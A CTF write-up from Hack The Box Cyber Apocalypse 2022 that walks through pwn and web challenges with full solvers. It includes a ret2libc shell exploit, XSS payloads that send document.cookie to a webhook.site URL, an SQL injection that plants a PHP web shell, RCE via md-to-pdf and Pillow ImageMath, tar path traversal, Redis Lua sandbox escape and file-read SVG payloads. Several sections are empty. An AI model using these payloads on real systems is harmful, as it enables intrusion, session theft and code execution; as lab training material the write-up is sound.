# Hack The Box - Cyber Apocalypse

A CTF Hosted by Hack The Box which lasted 5 days. I ranked 245th out of more than 7000 teams.

Each writeup include the given source file with a docker setup. I might've added few debuging outputs to the source files, which shouldn't impact the challenge itself.

------------

- [Pwn](#pwn)
	-  [Space Pirate: Entrypoint](#pwn1 "Space Pirate: Entrypoint")
	-  [Space pirate: Going Deeper](#pwn2)
	-  [Space pirate: Retribution](#pwn3)
	-  [Vault-breaker](#pwn4)
	-  [Fleet Management](#pwn5)
	-  [Hellbound](#pwn6)
	-  [Trick or Deal](#pwn7)
- [Web](#web)
	-  [Kryptos Support](#web1)
	-  [BlinkerFluids](#web2)
	-  [Amidst Us](#web3)
	-  [Intergalactic Post](#web4)
	-  [Acnologia Portal](#web5)
	-  [Red Island](#web6)
	-  [Mutation Lab](#web7)
- [Rev](#rev)
	-  [WIDE](#rev1)
- [Misc](#misc)
	-  [Compressor](#misc1)

------------

### Pwn
1. <p name="pwn1">Space Pirate: Entrypoint (★☆☆☆)</p>
We open the binary using Ghidra & check the `check_pass` function:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/check_pass_pwn1.png'>
</p>

So any password except `0nlyTh30r1g1n4lCr3wM3mb3r5C4nP455` will give us the flag:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/flag_pwn1.png'>
</p>

<br />

2. <p name="pwn2">Space Pirate: Going Deeper (★☆☆☆)</p>
We open the binary using Ghidra & check the `admin_panel` function:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/admin_panel_pwn2.png'>
</p>

This one checking for `DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft`, some used this password but didn't get the flag & the main reason for it is, when you press enter, you insert a new line character (`\n - HEX: 0a`).

Solver:

```python
from pwn import *

p = remote('165.227.224.55', 31561)

p.sendline(b'1')
p.sendline(b'DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\x00')

p.interactive()
```

<br />

3. <p name="pwn3">Space pirate: Retribution (★☆☆☆)</p>
So as a start, we check the binary security:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/checksec_pwn3.png'>
</p>

Then, we run the binary to have a quick look on it. We get a menu with 2 options:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/menu_pwn3.png'>
</p>

The first option does nothing but give us a static output, but the second option is a bit more interesting. We get asked for a new coordinate & our input gets reflected to us, as a start this might feel as a format string vulnerability but it's not.

If we send a long enough string, we do get a segmentation fault!

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/segfault_pwn3.png'>
</p>

So that's a good start, but we do not have any leaks yet, remember that we have PIE (**P**osition **I**ndependant **E**xecutable) enabled, which means that we cannot use any hard coded addresses, since the binary is based on offsets & it'll be loaded with a random memory address base.

Now, we'll need to find a memory leak. Let's head to Ghidra for some code analysis.

Checking the `main`, we know that `missile_launcher` function correspond to our second menu option. Let's have a look at the reversed code:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/ghidra_pwn3.png'>
</p>

If you look closely, you'll notice a small problem problem. `local_38` is declared at line 9 as a string but it was never initialized. An other thing to notice, is that we are using `read` which doesn't add a null byte (`\0`) at the end of the string & right after the `read`, we are printing the content of `local_38`.

If we write nothing in the `local_38`, we can get a memory leak at that address, if we land on a null byte, we can add few more characters.

Leak:
<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/leak_pwn3.png'>
</p>

So when I first started testing locally, My leak was missing one more byte but when I switched to remote, I was getting a perfect leak so I continued to work on the remote. Note that the solver might not work if you run it on your machine because of this.

So after some debuging, I found the address leaked & it's offset. After we got that, we can calculate our PIE Base & then do a basic ret2libc & what make things easier, we were given the libc. Solver:

```python
from pwn import *

pop_rdi = 0x0000000000000d33
ret = 0x0000000000000c38

r = remote("157.245.46.136", 32149) # process('./sp_retribution') # 
elf = ELF('./sp_retribution')
libc = ELF('./glibc/libc.so.6')

r.sendline(b"2")
r.sendline(b"")

r.recvuntil(b'99f], y = \n')
r.readline()

pie_base = r.readline().strip()

print('PIE Leak             :', (pie_base))
print('PIE Leak             :', len(pie_base))
pie_base = u64((b"\x0a" + pie_base).ljust(8, b'\x00')) - elf.sym['__libc_csu_init'] - 58
print('PIE Base             :', hex(pie_base))
print('Main                 :', hex(pie_base+elf.sym['main']))

# Leak libc adr of puts
payload1 = b"a" * 88
payload1 += p64(pie_base+pop_rdi)
payload1 += p64(pie_base+elf.got['puts'])
payload1 += p64(pie_base+elf.plt['puts'])

payload1 += p64(pie_base+elf.sym['missile_launcher'])

r.send(payload1)

r.recvuntil(b'have been reset!')
r.readline()

# Read leak
libc_leak = r.readline().strip()
libc_base = u64(libc_leak.ljust(8, b'\x00')) - libc.sym['puts']

print('')

print('Libc Leak            :', (libc_leak))
print('Libc Base            :', hex(libc_base))

r.sendline(b"")

# Pop a shell
payload2 = b"a"*88
payload2 += p64(pie_base+pop_rdi)
payload2 += p64(libc_base + next(libc.search(b'/bin/sh')))
payload2 += p64(libc_base + libc.sym['system'])

payload2 += p64(pie_base+elf.sym['main'])

r.send(payload2)

r.recvuntil(b' reset!')

r.interactive()
```

Flag: `HTB{d0_n0t_3v3R_pr355_th3_butt0n}`

<br/>

4. <p name="pwn4">Vault-breaker (★☆☆☆)</p>

5. <p name="pwn5">Fleet Management (★☆☆☆)</p>

6. <p name="pwn6">Hellbound (★★☆☆)</p>

7. <p name="pwn7">Trick or Deal (★★☆☆)</p>


<br/>

### Web
1. <p name="web1">Kryptos Support (★☆☆☆)</p>
For this challenge we were given a website with a `/login` & `/signup` pages. Upon signing up, we get the following page:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/report_web1.png'>
</p>

So, this should be a basic XSS since we didn't even get a source code. Going for a basic payload:

```html
<script>
    fetch('https://webhook.site/a02af4ea-d61b-440d-9982-c3804fd1587a?q='+document.cookie);
</script>
```

Gives us the moderator's cookies! Having a look on them, we see a session cookie.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/session_web1.png'>
</p>

We add the session & we visit `/settings`. The magic happens & we are logged in. 

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/settings_web1.png'>
</p>

There is no flag yet? We apparently need to access something higher, maybe an admin account? So we try the change password functionality & we have a look on the HTTP Request. We see that we are sending the UID in the request body:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/request_web1.png'>
</p>

Trying to find the admin ID, we change the UID to 1 & send our HTTP Request. We get a confirmation from the server:

```json
{
    "message": "Password for admin changed successfully!"
}
```

We login as the admin now & we get our flag: 

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/flag_web1.png'>
</p>

<br/>

2. <p name="web2">BlinkerFluids (★☆☆☆)</p>
For this one, we were given the source file ([Ref](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/)). Looking into the website, we see an invoice list & an option to add a new invoice.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web2.png'>
</p>

If we try to create a new invoice, we get a nice default text that is formated with Markdown Language.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/new_invoice_web2.png'>
</p>

Now, let's dig into the source code. Starting with the [/routes/index.js](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/challenge/routes/index.js), we see that the creation of an invoice uses an MDHelper.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/routes_web2.png'>
</p>

We then head to our helper file, located at [/helpers/MDHelper.js](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/challenge/helpers/MDHelper.js)

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/helpers_web2.png'>
</p>

So, if we consider our possible attack vectors, our main target will be the `md-to-pdf` module. So this will be our start!

The first thing we get related to security issues for this module will be `CVE-2021-23639`. It involves a Remote Code Execution caused by the gray-matter's JS-engine, which is enabled by default. This was fixed in version 5.0.0 of `md-to-pdf` but if we check [/package.json](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_blinkerfluids/challenge/package.json), we see that we are using version `4.1.0` so we got our exploit :)

For a proof of concept & more information, you can refer to these links:
- [Link 1](https://github.com/simonhaenisch/md-to-pdf/issues/99)
- [Link 2](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880)

We have access to `/static` route which means, we can use it to write our command output there. Our final payload will be:

```
---js
((require("child_process")).execSync("cat /flag.txt > /app/static/flag"))
---
```

& we'll be able to access `/static/flag` route & get our flag: `HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}`

<br/>

3. <p name="web3">Amidst Us (★☆☆☆)</p>
For this one, we were given the source file ([Ref](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/)). We get the following page:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web3.png'>
</p>

We click on the picture in the center & it'll prompt us to select a file to upload. Upon selecting a picture, we see that the white areas become transparent, so this is somekind of a picture converter. Let's have a look on the source code for this.

As a start, we notice that we are running a Flask app. We head to the [application/blueprints/routes.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/blueprints/routes.py) to check for routes & we get only 1 API route, `alphafy` used for image processing. We are using a helper method defined in [application/util.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/util.py). I've edited the source a little to help me debug the payload. The interesting part is the following:

```python
def make_alpha(data):
	color = data.get('background', [255,255,255])

	try:
		dec_img = base64.b64decode(data.get('image').encode())

		image = Image.open(BytesIO(dec_img)).convert('RGBA')
		img_bands = [band.convert('F') for band in image.split()]
		
		alpha = ImageMath.eval(
			f'''float(
				max(
				max(
					max(
					difference1(red_band, {color[0]}),
					difference1(green_band, {color[1]})
					),
					difference1(blue_band, {color[2]})
				),
				max(
					max(
					difference2(red_band, {color[0]}),
					difference2(green_band, {color[1]})
					),
					difference2(blue_band, {color[2]})
				)
				)
			)''',
			difference1=lambda source, color: (source - color) / (255.0 - color),
			difference2=lambda source, color: (color - source) / color,
			red_band=img_bands[0],
			green_band=img_bands[1],
			blue_band=img_bands[2]
		)
```

<br>

The rest of the function isn't important.<br/>So if we read the code, we can see that there is a `ImageMath.eval` that takes a string which contains `float` & `max` functions, this appears to be a python code maybe? We might use this part in order to get an RCE. Where is our input part?

We start first by viewing the HTTP requests. We see that we are sending a JSON object with 2 attributes:

```json
{
	"image":"iVBORw0K...............",
	"background":[255,255,255]
}
```

The image is sent as a base 64 string, we see that there is a background attribute too. If we check the [routes](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/application/blueprints/routes.py) file again, we see that our input is passed directly to the helper function, without any validation.

```python
@api.route('/alphafy', methods=['POST'])
def alphafy():
	if not request.is_json or 'image' not in request.json:
		return abort(400)

	return make_alpha(request.json)
```

Now, we see that the `background` attribute is being used in the helper function & it's passed into the `ImageMath.eval` call:

```python
color = data.get('background', [255,255,255])
```

& since there is no validation, we can inject anything into the `color` array!

Before that, let's try to gather a bit more information about this method. A quick google search would land us on a `CVE-2022-22817` & we get the following ([Source](https://vuldb.com/?id.189840)):

> PIL.ImageMath.eval in Pillow before 9.0.0 allows evaluation of arbitrary expressions, such as ones that use the Python exec method.

Having a quick look at [/requirements.txt](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_amidst_us/challenge/requirements.txt), we see that we are using `Pillow 8.4.0` & now, we got our RCE confirmed.

As a start, I thought of crafting a payload to close the `max` & `float` calls then inject my code to be executed but after debuging a little bit, it was hell. I had to figure an other way to inject the code...

After a while, I remembered that we already know the flag's path. Also, I remembered that the `file.write` function returns the number of characters written into a file. So if we inject a `open().write` call, we'll get our code executed + return an integer to keep the execution of the helper function working. Combining that with a `open().read`, we can extract our flag into a public route, `/static`.

Of course, we can pop a shell by importing os & executing shell commands but meh, we know where our flag is so let's grab it & go.

We end up with a final payload:

```json
{
	"image":"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z/C/HgAGgwJ/lK3Q6wAAAABJRU5ErkJggg==",
	"background":[
		255,
		"open('/app/application/static/flag', 'w').write(open('/flag.txt').read())",
		255
	]
}
```

& we get our flag in `/static/flag`: `HTB{i_slept_my_way_to_rce}`

<br/>

4. <p name="web4">Intergalactic Post (★☆☆☆)</p>
For this one, we were given the source file ([Ref](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_intergalactic_post/)). We get the following home page:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web4.png'>
</p>

A simple page for email subscription, nothing more... We'll have to check the code for this one, we see that we got a PHP server. Checking the provided controllers, we can directly check the [/controllers/SubsController.php](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_intergalactic_post/challenge/controllers/SubsController.php) file. We mainly have 2 functionalities:

```php
    public function store($router)
    {
        $email = $_POST['email'];

        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            header('Location: /?success=false&msg=Please submit a valild email address!');
            exit;
        }

        $subscriber = new SubscriberModel;
        $subscriber->subscribe($email);

        header('Location: /?success=true&msg=Email subscribed successfully!');
        exit;
    }

    public function logout($router)
    {
        session_destroy();
        header('Location: /admin');
        exit;
    }
```

Let's focus on the subscription part, we see that our given email is validated using `filter_var($email, FILTER_VALIDATE_EMAIL)`, so as a start, we check PHP documentation ([ref](https://www.php.net/manual/en/function.filter-var.php)) but there is nothing interesting for now... 

Moving on, we'll check our `SubscriberModel` class, located at [/models/SubscriberModel.php](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_intergalactic_post/challenge/controllers/SubsController.php)

Now, we see some interesting code:

```php
    public function getSubscriberIP(){
        if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
            return  $_SERVER["HTTP_X_FORWARDED_FOR"];
        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
            return $_SERVER["REMOTE_ADDR"];
        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
            return $_SERVER["HTTP_CLIENT_IP"];
        }
        return '';
    }

    public function subscribe($email)
    {
        $ip_address = $this->getSubscriberIP();
        return $this->database->subscribeUser($ip_address, $email);
    }
```

We see that the `$ip_address` isn't validated, so that should be our attack vector? Checking the `getSubscriberIP()` method, it's basically extracting the IP from the request header, `X-Forwarded-For`, if included. And this will be our SQL injection, but what kind of database are we using?

Checkig [/Database.php](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_intergalactic_post/challenge/Database.php), we see that we are using SQLite, we also confirm that the `subscribeUser` method is vulnerable to SQL Injection

```php
    public function subscribeUser($ip_address, $email)
    {
        return $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')");
    }
```

And if you're not familliar with SQLite, it's a file based database, which means, we have the possibility to write files. This explains the change of NodeJS to a PHP app, we are in the correct path.

We can basically create a new database file in a public path (`/www/`), insert a php code in it & when we visit it, it'll be executed.

That's translated in SQL with this:

```SQL
attach '/www/door.php' as bd; 
create table bd.rce(cc text); 
insert into bd.rce values('<?php echo system($_GET["c"]); ?>');
```

Now, we'll inject this using our headers. We add a `X-Forwarded-For` to our subscription post request:

```http
X-Forwarded-For: hiiii', 'hhh'); attach '/www/door.php' as bd; create table bd.rce(cc text); insert into bd.rce values('<?php echo system($_GET["c"]); ?>'); -- f
```

which will result in the following query to be executed:

```SQL
INSERT INTO subscribers (ip_address, email) VALUES('hiiii', 'hhh'); attach '/www/door.php' as bd; create table bd.rce(cc text); insert into bd.rce values('<?php echo system($_GET["c"]); ?>'); -- f', 'myemail@hi.rce')
```

The `--` is used as a one line comment in SQL.

And that, gives us a backdoor file at `/door.php`. We find the flag file & get it's content: `HTB{inj3ct3d_th3_tru7h}`

<br/>

5. <p name="web5">Acnologia Portal (★★☆☆)</p>
Moving to the next one, we get a Flask app source code for this one  ([Ref](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_acnologia_portal/)). We get a login page with the option of account creation, so we signup & connect:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web5.png'>
</p>

After logging in, we get a 'Firmware List' with an option to report a bug:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/firmware_list_web5.png'>
</p>

Going for the report option, we get a report form, simillar to the Kryptos Support.

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/report_web5.png'>
</p>

I doubt this'll be a normal XSS. Going for the basic payload

```html
<script>
	fetch('https://webhook.site/a02af4ea-d61b-440d-9982-c3804fd1587a?q='+document.cookie);
</script>
```

But we get an empty response:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/webhook_web5.png'>
</p>

Looking at the source code, we see an option to upload a Firmware:

[Routes.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_acnologia_portal/challenge/application/blueprints.py)
```python
@api.route('/firmware/upload', methods=['POST'])
@login_required
@is_admin
def firmware_update():
    if 'file' not in request.files:
        return response('Missing required parameters!'), 401
    
    extraction = extract_firmware(request.files['file'])
    if extraction:
        return response('Firmware update initialized successfully.')

    return response(request.files['file'].filename), 403
```
<br/>

[Util.py](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/web_acnologia_portal/challenge/application/util.py)
```python
def extract_firmware(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)
    
    with open(path, 'rb') as f:
        d = f.read()

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        rand_dir = generate(15)
        extractdir = f"{current_app.config['UPLOAD_FOLDER']}/{rand_dir}"
        os.makedirs(extractdir, exist_ok=True)
        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                try:
                    filename = f'{extractdir}/{name}'
                    os.rename(os.path.join(tmp, name), filename)
                    continue
                except:
                    pass
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
        tar.close()
        return True

    return False
```

So we are uploading a tar file & extracting it's content without any validation, which leads us to a Zip-Slip. Since the flag path is known, I decided to simply upload a link file to a public location (`/static`).

Starting with our file payload, I created a link file to /flag.txt (`ln -s /flag.txt`) then I used this script to create the tar file:

```python
import tarfile

tar = tarfile.open(path, 'w:gz')
tar.add('flag_link', '../../../../../../app/application/static/flag')
tar.close()
```

Now, the upload part... When you're uploading a file, the selected file is transformed into a `File` object, which is sent to the server. So I searched for how to actually create a `File` instance & set it's content.

After a bit of searching, I ended up with the following

```javascript
// File content b64 encoded, atob decodes base 64 strings
let content = atob('H4sICHqTg2IC/3Rlc3QudGFyAO3TT0vDMBjH8Zx9FTkI00uStmm34Z95ET168CZDQi02YNeyRpjv1KPvZLbu4BDUgzh0+36S8IQ8gRzCT2mlz67c4rJwd8Vc/Aqz8lk1JrHv+/48MnEUC7kQG/DYBjfvnhe7KR7JKviqOImyNO6Htcom43EySvYEtp7Sam26punXg89d8PVMd9kIPtelV03Z/Cj/mX3LeDRMzXpdsR/znw3TVEizyfxX9ezef3Hvu/4/tXxevhxPut+VRV7Wsn1qQ1Ed7N9enF/fDPLB9PBockpKAAAAAAAAAAAAAAAA/q5XAWe8/gAoAAA=')
n = content.length;

// Will be used to store the decoded bytes & used in the File constructor.
u8arr = new Uint8Array(n);

// Just transfer the string to the UInt8Arr
while(n--){
    u8arr[n] = content.charCodeAt(n);
}

// Create File object
f = new File([u8arr], "payload.tar", {type: "application/x-tar" });

// Setup form data to be sent
const formData = new FormData();
formData.append('file', f);

await fetch('http://localhost:1337/api/firmware/upload', {
    method: 'POST',
    body: formData })

```

And we get our link file at `/static/flag` ! Flag: `HTB{des3r1aliz3_4ll_th3_th1ngs}`

* Notes:
	- There was the possibility of gaining an RCE using the Pickle serialization problem by overwriting the flask session file.

<br/>

6. <p name="web6">Red Island (★★☆☆)</p>
This was one of my favorite challenges, I spent a while in order to solve this. As a start, we didn't get any source code for this one but if you're familliar with Redis, you will be able to understand the challenge name. If not, no worries, I had no clue either.

We started in a signup/login page:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/login_web6.png'>
</p>

After connecting, we get the following home page:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web6.png'>
</p>

We could load any picture url using the home page, so as a begining, we try to load a random url (Not a picture) & it gives us an error: `Unknown error occured while fetching the image file: `

So, this could be a potential SSRF. If we try `file:///etc/passwd`, we'll successfully receive the `passwd` file from the machine.

This is a good start. Now, we can get our source file. Looking at the url route, there is a high chance that this is a node js app, so I tried my luck & used `file:///app/index.js` & I successfully got the [index.js](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/Red%20Island/index.js) file:

```js
const express = require('express'); 
const app = express(); 
const session = require('express-session'); 
const RedisStore = require("connect-redis")(session) 
const path = require('path'); 
const cookieParser = require('cookie-parser'); 
const nunjucks = require('nunjucks'); 
const routes = require('./routes'); 
const Database = require('./database'); 
const { createClient } = require("redis") 
const redisClient = createClient({ legacyMode: true }) 
const db = new Database('redisland.db'); 

app.use(express.json()); 
app.use(cookieParser()); 

redisClient.connect().catch(console.error)

app.use( session({ 
	store: new RedisStore({ client: redisClient }), 
	saveUninitialized: false, secret: "r4yh4nb34t5B1gM4c", resave: false, 
}));
....
```

To be sure, I also leaked a couple more source files, If you're interested you can find them [here](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/Red%20Island/) but we'll not be needing them now.

So looking at the source, we see a Redis database & a session secret. Sadly, there is no admin account so we got nothing to do with it.

At the start of the challenge, I didn't actually know what Redis is, so I had to google for a while to understand how it works & what are the known methods to exploit it. I ended up spending 2 to 3 hours attempting to send a module to the remote using the Master-Slave technique but I failed. At this time, I made a script to send redis commands to the server.

```python
import requests
import os


def encodeChar(c):
 if c == ' ':
  return '%20' 
 if c == '\n':
  return '%0a' 
 return c


def getResp(r):
 resp = r.content.decode()
 resp = resp.replace('{"message":"', '')[:-2].replace('\\r\\n', '\n').replace('Unknown error occured while fetching the image file: ', '')
 return resp


def urlEncode(s): # Encode redis commands
 return ''.join([encodeChar(x) for x in s])


def execCmd(cmd):
 # Manually edit the session cookie
 cookie = "connect.sid=s%3A1algRY5pNOqG9dlgwqICKg3qtHssGQAM.W3Cuqv%2BLO0mnacWhPEqBcRNBYSH6r5MZUq125IK2CqA"
 url = "http://138.68.188.223:30153"
 
 urlbody = urlEncode("gopher://127.0.0.1:6379/a"+cmd+"\nquit")
 body = {"url":urlbody}
 r = requests.post(url+'/api/red/generate', headers={'Cookie': cookie}, json=body)
 return getResp(r)


while True:
 cmd = input('> ')
 print(execCmd(cmd))

```

Also, when looking around, I realized that we have root access with the Redis cli. Meanwhile, the web app had no root access. In fact, the flag was located in `/root/flag` & I wasn't able to get it using the LFI. I was able to find the correct path using `config set dir /root/flag` command, since it gives a different output if the given path is a file, not actually a folder.

At this point I had to move on & find something else, & luckly, I landed on a recent CVE: `CVE-2022-0543` that involved a lua sandbox escape.

For the sake of information, Redis is an in-memory database which provides a command (`EVAL`) to execute Lua script in a sandboxed environment, not allowing any command executions or reading/writing files. The sandbox escape is caused by the `package` variable, which is automatically initialized, which allowed access to arbitrary lua functions & this leads to a an arbitrary code execution. ([Red](https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/))

So using this, we can pop our shell! & we also got a ready proof of concept in the link above so if we change it a little bit to grab our flag (Or get an RCE, we can do anything at this point):

Lua script:
```lua
local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
local io = io_l();
local f = io.popen("cat /root/flag", "r"); 
local res = f:read("*a"); 
f:close(); 
return res
```

Payload:
```lua
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /root/flag", "r"); local res = f:read("*a"); f:close(); return res' 0
```

We get our flag:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/flag_web6.png'>
</p>

`HTB{r3d_righ7_h4nd_t0_th3_r3dis_land!}`

<br/>

7. <p name="web7">Mutation Lab (★★☆☆)</p>
For this one, we didn't get any source code. We get a login/signup page at the given url & after connecting we get the following page:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web7.png'>
</p>

The challenge description is the following:

> One of the renowned scientists in
the research of cell mutation, Dr.
Rick, was a close ally of Draeger.
The by-products of his research,
themutant army wrecked a lot of
havoc during the energy-crisis
war. To exterminate the leftover
mutants that now roam over the
abandoned areas on the planet
Vinyr, we need to acquire the cell
structures produced in Dr. Rick’s
mutation lab. Ulysses managed
to find a remote portal with
minimal access to Dr. Rick’s
virtual lab. Can you help him
uncover the experimentations of
the wicked scientist?

So apparently, we'll need to gain admin access.

Starting to try things out, if we click on the export option, we'll get the svg picture in the home page exported:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/exported_web7.png'>
</p>

If we check the request header, we see that we are sending an `svg` image to the server, which then gets exported:

```json
{
    "svg":"<svg version=\"1.1\" xmlns=\"http://www.w3.org/2000/svg\" ... -86.89884,0z\"/></g></svg>"
}
```

So, we should have a place to start now. After a bit of researching, I found a `CVE-2021-23631` that involved Directory Traversal attack which is affecting `convert-svg-core` module & the first thing we see is:

>  How to fix?
There is no fixed version for convert-svg-core.

This must be it! The attack is simple, we just add an `iframe` to the svg content & use the `src` attribute to pick our file.

So, we shall leak our source code now, payload:

```json
{
    "svg":"<svg-dummy></svg-dummy><iframe src=\"file:///app/index.js\" width=\"100%\" height=\"1000px\"></iframe><svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\">  <text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>"
}
```

I didn't save the leaked picture but, we'll simply see that we are using a session secret from environment variables. Our next step is to leak the `.env` file:

```json
{
    "svg":"<svg-dummy></svg-dummy><iframe src=\"file:///app/.env\" width=\"100%\" height=\"1000px\"></iframe><svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\">  <text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>"
}
```

And we get the following:

<p align="center">
    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/env_web7.png'>
</p>

And our session is (base 64 decoded):

```json
{
    "username":"11"
}
```

We simply change the username to `admin`, setup a node app using the same session key & get a new signature to use.

Flag: `HTB{fr4m3d_th3_s3cr37s_f0rg3d_th3_entrY}`

<br/>

### Rev
1. <p name="rev1">WIDE (★☆☆☆)</p>

<br/>

### Misc
1. <p name="misc1">Compressor (★☆☆☆)</p>


WIP